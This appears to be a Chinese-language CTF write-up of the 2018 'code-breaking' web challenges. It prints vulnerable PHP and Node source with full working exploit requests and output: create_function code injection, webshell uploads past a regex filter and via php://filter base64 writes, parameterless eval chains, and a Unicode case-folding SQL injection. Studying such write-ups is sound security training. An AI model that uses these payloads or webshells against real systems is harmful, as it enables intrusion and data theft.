---
title: code-breaking
date: 2018-11-25 12:03:18
tags:
password: codebreaking
---

# function

```
<?php
$action = $_GET['action'] ?? '';
$arg = $_GET['arg'] ?? '';

if(preg_match('/^[a-z0-9_]*$/isD', $action)) {
    show_source(__FILE__);
} else {
    $action('', $arg);
}
```

随便测试了一下啊，发现加函数名中加`\`可以继续执行方法。

```
http://51.158.75.42:8087/?action=\create_function&arg=}?%3E%3C?php%20$dr%20=%20@opendir(%27../%27);%20while(($files[]%20=%20readdir($dr))%20!==%20false);%20print_r($files);;/*

这个warning忽略就行了，仍然能够执行代码。
结果:
Warning: Unterminated comment starting line 1 in /var/www/html/index.php(8) : runtime-created function on line 1
Array ( [0] => html [1] => .. [2] => . [3] => flag_h0w2execute_arb1trary_c0de [4] => )

http://51.158.75.42:8087/?action=\create_function&arg=}?%3E%3C?php%20echo%20file_get_contents(%22../flag_h0w2execute_arb1trary_c0de%22);;/*
结果:
flag{03fdc0ee2fc464aac3c40ef0e20dcb5a}
```



# pcrewaf

```
<?php
function is_php($data){
    return preg_match('/<\?.*[(`;?>].*/is', $data);
}

if(empty($_FILES)) {
    die(show_source(__FILE__));
}

$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);
$data = file_get_contents($_FILES['file']['tmp_name']);
if (is_php($data)) {
    echo "bad request";
} else {
    @mkdir($user_dir, 0755);
    $path = $user_dir . '/' . random_int(0, 10) . '.php';
    move_uploaded_file($_FILES['file']['tmp_name'], $path);

    header("Location: $path", true, 303);
} 
```

参考链接: https://github.com/LCTF/LCTF2017/tree/master/src/web/%E8%90%8C%E8%90%8C%E5%93%92%E7%9A%84%E6%8A%A5%E5%90%8D%E7%B3%BB%E7%BB%9F

首先第一个.*会走到//aaaaa，也就是字符串末尾，然后发现匹配不上，因为后面需要匹配一个[(`;?>]

于是就开始回溯，回溯到//aaaa，发现还是不行，再回溯到//aaa，直到回溯到<?php eval，然后发现匹配上了，那么如果a的数量超过pcre.backtrack_limit，他一直回溯，超过了这个限制，于是正则引擎就报错

**http://www.laruence.com/2010/06/08/1579.html
刚说错了，是“非贪婪模式”可以绕过正则，这是参考文章，php的正则默认是贪婪模式，也就是不加问号（?）的，本题没有问号，所以和鸟哥说的这种问题不一样**

```shell
ht@TIANJI:/mnt/c/Users/HT/Desktop/pithon$ python
Python 2.7.12 (default, Dec  4 2017, 14:50:18)
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> reat_str = 'a' * 1000 * 1000
## 建议 不要在字符串最后边加上 `*/?>`, 测试没成功
>>> text = '<?php echo $_GET["a"];system($_GET["b"]);eval($_GET["a"]); /*' + reat_str
>>> f = open("test.php", "w")
>>> f.write(text)
>>> f.close()
>>> exit()
ht@TIANJI:/mnt/c/Users/HT/Desktop/pithon$ curl -v -F "file=@test.php" "http://51.158.75.42:8088/"
*   Trying 51.158.75.42...
* Connected to 51.158.75.42 (51.158.75.42) port 8088 (#0)
> POST / HTTP/1.1
> Host: 51.158.75.42:8088
> User-Agent: curl/7.47.0
> Accept: */*
> Content-Length: 1000261
> Expect: 100-continue
> Content-Type: multipart/form-data; boundary=------------------------f51aab48e90b0625
>
< HTTP/1.1 100 Continue
< HTTP/1.1 303 See Other
< Date: Mon, 26 Nov 2018 01:41:00 GMT
< Server: Apache/2.4.25 (Debian)
< X-Powered-By: PHP/7.1.24
< Location: data/c34fe503bf65cdd1c547ba6991749288/6.php
< Content-Length: 0
< Content-Type: text/html; charset=utf-8
* HTTP error before end of send, stop sending
<
* Closing connection 0
ht@TIANJI:/mnt/c/Users/HT/Desktop/pithon$ curl "http://51.158.75.42:8088/data/c34fe503bf65cdd1c547ba6991749288/6.php?a=var_dump(glob(%27/var/www/*%27));"
var_dump(glob('/var/www/*'));array(2) {
  [0]=>
  string(31) "/var/www/flag_php7_2_1s_c0rrect"
  [1]=>
  string(13) "/var/www/html"
}
ht@TIANJI:/mnt/c/Users/HT/Desktop/pithon$ curl "http://51.158.75.42:8088/data/c34fe503bf65cdd1c547ba6991749288/6.php?a=echo%20file_get_contents('/var/www/flag_php7_2_1s_c0rrect');"
echo file_get_contents('/var/www/flag_php7_2_1s_c0rrect');flag{216728a834fb4c1e0bc6893e135f436e}
```



# phpmagic

```
<?php
if(isset($_GET['read-source'])) {
    exit(show_source(__FILE__));
}

define('DATA_DIR', dirname(__FILE__) . '/data/' . md5($_SERVER['REMOTE_ADDR']));

if(!is_dir(DATA_DIR)) {
    mkdir(DATA_DIR, 0755, true);
}
chdir(DATA_DIR);

$domain = isset($_POST['domain']) ? $_POST['domain'] : '';
$log_name = isset($_POST['log']) ? $_POST['log'] : date('-Y-m-d');
?>
<!doctype html>
<html lang="en">
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css" integrity="sha256-eSi1q2PG6J7g7ib17yAaWMcrr5GrtohYChqibrV7PBE=" crossorigin="anonymous">

    <title>Domain Detail</title>
    <style>
    pre {
        width: 100%;
        background-color: #f6f8fa;
        border-radius: 3px;
        font-size: 85%;
        line-height: 1.45;
        overflow: auto;
        padding: 16px;
        border: 1px solid #ced4da;
    }
    </style>
</head>
<body>

<div class="container">
    <div class="row">
        <div class="col">
            <form method="post">
                <div class="input-group mt-3">
                    <div class="input-group-prepend">
                        <span class="input-group-text" id="basic-addon1">dig -t A -q</span>
                    </div>
                    <input type="text" name="domain" class="form-control" placeholder="Your domain">
                    <div class="input-group-append">
                        <button class="btn btn-outline-secondary" type="submit">执行</button>
                    </div>
                </div>
            </form>
        </div>
    
    </div>

    <div class="row">
        <div class="col">
            <pre class="mt-3"><?php if(!empty($_POST) && $domain):
                $command = sprintf("dig -t A -q %s", escapeshellarg($domain));
                $output = shell_exec($command);

                $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);

                $log_name = $_SERVER['SERVER_NAME'] . $log_name;
                if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'], true)) {
                    file_put_contents($log_name, $output);
                }

                echo $output;
            endif; ?></pre>
        </div>
    </div>

</div>

</body>
</html> 1
```

p师傅`绕过死亡exit时候的一个技巧，`file_put_contents的文件名是可以使用`php`伪协议的，也就是说，可以对文件内容进行`base64_decode`后再写入文件的,可参考如下: websec.fr level24.

然后写入文件的后缀使用了[另外一个小技巧](http://wonderkun.cc/index.html/?p=626)，php在处理路径的时候，会递归的删除掉路径中存在的`/.`

```POST / HTTP/1.1
POST / HTTP/1.1
Host: php
domain=xxx&log=://filter/convert.base64-decode/resource=/var/www/html/data/d048eec664d8a61e7cdf1469ea8d1f31/aaad.php/.
```

方法一：为了好控制base64_decode的内容，把内容写到了cname中，

参考如下:https://www.cnblogs.com/iamstudy/articles/code_breaking_writeup.html#_label2

方法二：由于参数会显示出来，可以直接输入base64字符串，该字符串需要精心准备，否则无法准确解码。

```shell
ht@TIANJI:/mnt/c/Users/HT/Desktop/pithon$ echo -n "Ki8/Pjw/cGhwIGV2YWwoJF9HRVRbJ2FhJ10pOy8q" | base64 -d
*/?><?php eval($_GET['aa']);/*
ht@TIANJI:/mnt/c/Users/HT/Desktop/pithon$ echo -n "><?php eval(\$_GET['bb']);/*" | base64
Pjw/cGhwIGV2YWwoJF9HRVRbJ2JiJ10pOy8q
ht@TIANJI:/mnt/c/Users/HT/Desktop/pithon$ echo -n "*<?php eval(\$_GET['bb']);/*" | base64
Kjw/cGhwIGV2YWwoJF9HRVRbJ2JiJ10pOy8q
```

```shell
ht@TIANJI:/mnt/c/Users/HT/Desktop/pithon$ curl -v -H "Host:php" -d "domain=Ki8/Pjw/cGhwIGV2YWwoJF9HRVRbJ2FhJ10pOy8q&log=://filter/convert.base64-decode/resource=/var/www/html/data/c34fe503bf65cdd1c547ba6991749288/bbb.php/." "http://51.158.75.42:8082"
* Rebuilt URL to: http://51.158.75.42:8082/
*   Trying 51.158.75.42...
* Connected to 51.158.75.42 (51.158.75.42) port 8082 (#0)
> POST / HTTP/1.1
> Host:php
> User-Agent: curl/7.47.0
> Accept: */*
> Content-Length: 154
> Content-Type: application/x-www-form-urlencoded
>
* upload completely sent off: 154 out of 154 bytes
< HTTP/1.1 200 OK
< Date: Mon, 26 Nov 2018 02:53:11 GMT
< Server: Apache/2.4.10 (Debian)
< X-Powered-By: PHP/5.6.33
< Vary: Accept-Encoding
< Content-Length: 2136
< Content-Type: text/html; charset=utf-8
<
<!doctype html>
<html lang="en">
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css" integrity="sha256-eSi1q2PG6J7g7ib17yAaWMcrr5GrtohYChqibrV7PBE=" crossorigin="anonymous">

    <title>Domain Detail</title>
    <style>
    pre {
        width: 100%;
        background-color: #f6f8fa;
        border-radius: 3px;
        font-size: 85%;
        line-height: 1.45;
        overflow: auto;
        padding: 16px;
        border: 1px solid #ced4da;
    }
    </style>
</head>
<body>

<div class="container">
    <div class="row">
        <div class="col">
            <form method="post">
                <div class="input-group mt-3">
                    <div class="input-group-prepend">
                        <span class="input-group-text" id="basic-addon1">dig -t A -q</span>
                    </div>
                    <input type="text" name="domain" class="form-control" placeholder="Your domain">
                    <div class="input-group-append">
                        <button class="btn btn-outline-secondary" type="submit">执行</button>
                    </div>
                </div>
            </form>
        </div>

    </div>

    <div class="row">
        <div class="col">
            <pre class="mt-3">
; &lt;&lt;&gt;&gt; DiG 9.9.5-9+deb8u15-Debian &lt;&lt;&gt;&gt; -t A -q Ki8/Pjw/cGhwIGV2YWwoJF9HRVRbJ2FhJ10pOy8q
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NXDOMAIN, id: 63063
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 0

;; QUESTION SECTION:
;ki8/pjw/cghwigv2ywwojf9hrvrbj2fhj10poy8q. IN A

;; AUTHORITY SECTION:
.                       10800   IN      SOA     a.root-servers.net. nstld.verisign-grs.com. 2018112501 1800 900 604800 86400

;; Query time: 499 msec
;; SERVER: 127.0.0.11#53(127.0.0.11)
;; WHEN: Mon Nov 26 02:53:12 UTC 2018
;; MSG SIZE  rcvd: 133

</pre>
        </div>
    </div>

</div>

</body>
* Connection #0 to host 51.158.75.42 left intact
</html>ht@TIANJI:/mnt/c/Users/HT/Desktop/pithon$
ht@TIANJI:/mnt/c/Users/HT/Desktop/pithon$ curl -v "http://51.158.75.42:8082/data/c34fe503bf65cdd1c547ba6991749288/bbb.php?aa=var_dump(glob(%27/var/www/*%27));"
*   Trying 51.158.75.42...
* Connected to 51.158.75.42 (51.158.75.42) port 8082 (#0)
> GET /data/c34fe503bf65cdd1c547ba6991749288/bbb.php?aa=var_dump(glob(%27/var/www/*%27)); HTTP/1.1
> Host: 51.158.75.42:8082
> User-Agent: curl/7.47.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Mon, 26 Nov 2018 02:54:10 GMT
< Server: Apache/2.4.10 (Debian)
< X-Powered-By: PHP/5.6.33
< Vary: Accept-Encoding
< Content-Length: 134
< Content-Type: text/html; charset=utf-8
<
m-♫!~u^Cy[e♂`**/?>array(2) {
  [0]=>
  string(26) "/var/www/flag_phpmag1c_ur1"
  [1]=>
  string(13) "/var/www/html"
}
* Connection #0 to host 51.158.75.42 left intact
ht@TIANJI:/mnt/c/Users/HT/Desktop/pithon$ curl "http://51.158.75.42:8082/data/c34fe503bf65cdd1c547ba6991749288/bbb.php?aa=var_dump(glob(%27/var/www/*%27));"
m-♫!~u^Cy[e♂`**/?>array(2) {
  [0]=>
  string(26) "/var/www/flag_phpmag1c_ur1"
  [1]=>
  string(13) "/var/www/html"
}
ht@TIANJI:/mnt/c/Users/HT/Desktop/pithon$ curl "http://51.158.75.42:8082/data/c34fe503bf65cdd1c547ba6991749288/bbb.php?aa=echo%20file_get_contents('/var/www/flag_phpmag1c_ur1');"
m-♫!~u^Cy[e♂`**/?>flag{8fd9046cde2d53d1ceea8970286fd38c}
```

# phplimit

```
<?php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
} else {
    show_source(__FILE__);
}
```

正则表达式的意思是: 只允许 `functionname()`格式。

在apache中可以使用`getallheaders()`,nginx中没有，可以使用`get_defined_vars()`

其他方法：

`code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));`

`eval(session_id(session_start()));`

另外在php 7.1下，`getenv()`函数新增了无参数时会获取服务段的env数据，这个时候也可以利用

```sh
ht@TIANJI:/mnt/c/Users/HT/Desktop/pithon$ curl "http://51.158.75.42:8084/index.php?code=eval(next(current(get_defined_vars())));&b=var_dump(glob(%27/var/www/*%27));" 
array(2) {                                                                             
  [0]=>                                                                                 
  string(23) "/var/www/flag_phpbyp4ss"                                                
  [1]=>                                                                                 
  string(13) "/var/www/html"            
}                                                                                       ht@TIANJI:/mnt/c/Users/HT/Desktop/pithon$ curl "http://51.158.75.42:8084/index.php?code=eval(next(current(get_defined_vars())));&b=echo%20file_get_contents('/var/www/flag_phpbyp4ss');"
flag{e86963ba34687d269b9faf526ce68cd7}                    
```

# nodechr

```
// initial libraries
const Koa = require('koa')
const sqlite = require('sqlite')
const fs = require('fs')
const views = require('koa-views')
const Router = require('koa-router')
const send = require('koa-send')
const bodyParser = require('koa-bodyparser')
const session = require('koa-session')
const isString = require('underscore').isString
const basename = require('path').basename

const config = JSON.parse(fs.readFileSync('../config.json', {encoding: 'utf-8', flag: 'r'}))

async function main() {
    const app = new Koa()
    const router = new Router()
    const db = await sqlite.open(':memory:')

    await db.exec(`CREATE TABLE "main"."users" (
        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
        "username" TEXT NOT NULL,
        "password" TEXT,
        CONSTRAINT "unique_username" UNIQUE ("username")
    )`)
    await db.exec(`CREATE TABLE "main"."flags" (
        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
        "flag" TEXT NOT NULL
    )`)
    for (let user of config.users) {
        await db.run(`INSERT INTO "users"("username", "password") VALUES ('${user.username}', '${user.password}')`)
    }
    await db.run(`INSERT INTO "flags"("flag") VALUES ('${config.flag}')`)

    router.all('login', '/login/', login).get('admin', '/', admin).get('static', '/static/:path(.+)', static).get('/source', source)

    app.use(views(__dirname + '/views', {
        map: {
            html: 'underscore'
        },
        extension: 'html'
    })).use(bodyParser()).use(session(app))
    
    app.use(router.routes()).use(router.allowedMethods());
    
    app.keys = config.signed
    app.context.db = db
    app.context.router = router
    app.listen(3000)
}

function safeKeyword(keyword) {
    if(isString(keyword) && !keyword.match(/(union|select|;|\-\-)/is)) {
        return keyword
    }

    return undefined
}

async function login(ctx, next) {
    if(ctx.method == 'POST') {
        let username = safeKeyword(ctx.request.body['username'])
        let password = safeKeyword(ctx.request.body['password'])

        let jump = ctx.router.url('login')
        if (username && password) {
            let user = await ctx.db.get(`SELECT * FROM "users" WHERE "username" = '${username.toUpperCase()}' AND "password" = '${password.toUpperCase()}'`)

            if (user) {
                ctx.session.user = user

                jump = ctx.router.url('admin')
            }

        }

        ctx.status = 303
        ctx.redirect(jump)
    } else {
        await ctx.render('index')
    }
}

async function static(ctx, next) {
    await send(ctx, ctx.path)
}

async function admin(ctx, next) {
    if(!ctx.session.user) {
        ctx.status = 303
        return ctx.redirect(ctx.router.url('login'))
    }

    await ctx.render('admin', {
        'user': ctx.session.user
    })
}

async function source(ctx, next) {
    await send(ctx, basename(__filename))
}

main()
```

参考链接: https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html

通过fuzz可以发现（进行urldecode）`%C4%B1`.toUpperCase为`i`，`%C5%BF`为`s`

```
ht@TIANJI:/mnt/c/Users/HT/Desktop/pithon$ curl -v -d "username=aaaaa&password=%27+un%C4%B1on+%C5%BFelect+1,(%C5%BFelect+flag+from+flags),'3" "http://51.158.73.123:8085/login/"
*   Trying 51.158.73.123...
* Connected to 51.158.73.123 (51.158.73.123) port 8085 (#0)
> POST /login/ HTTP/1.1
> Host: 51.158.73.123:8085
> User-Agent: curl/7.47.0
> Accept: */*
> Content-Length: 85
> Content-Type: application/x-www-form-urlencoded
>
* upload completely sent off: 85 out of 85 bytes
< HTTP/1.1 303 See Other
< Location: /
< Content-Type: text/html; charset=utf-8
< Content-Length: 33
< Set-Cookie: koa:sess=eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6ImZsYWd7ODY0MGJmMmRjNGFhYzQzZTkyYzE5ZTA0MDQ0NjQzOTR9IiwicGFzc3dvcmQiOiIzIn0sIl9leHBpcmUiOjE1NDMyNDcyNjA5NjMsIl9tYXhBZ2UiOjg2NDAwMDAwfQ==; path=/; httponly
< Set-Cookie: koa:sess.sig=XUbTzgp1-s8pM-_GilMjSuqzn78; path=/; httponly
< Date: Sun, 25 Nov 2018 15:47:40 GMT
< Connection: keep-alive
<
* Connection #0 to host 51.158.73.123 left intact
Redirecting to <a href="/">/</a>.

flag就保存在cookie中:
ht@TIANJI:/mnt/c/Users/HT/Desktop/pithon$ echo eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6ImZsYWd7ODY0MGJmMmRjNGFhYzQzZTkyYzE5ZTA0MDQ0NjQzOTR9IiwicGFzc3dvcmQiOiIzIn0sIl9leHBpcmUiOjE1NDMyNDY4MTQ3MTQsIl9tYXhBZ2UiOjg2NDAwMDAwfQ== | base64 -d
{"user":{"id":1,"username":"flag{8640bf2dc4aac43e92c19e0404464394}","password":"3"},"_expire":1543246814714,"_maxAge":86400000}
```

# javacon



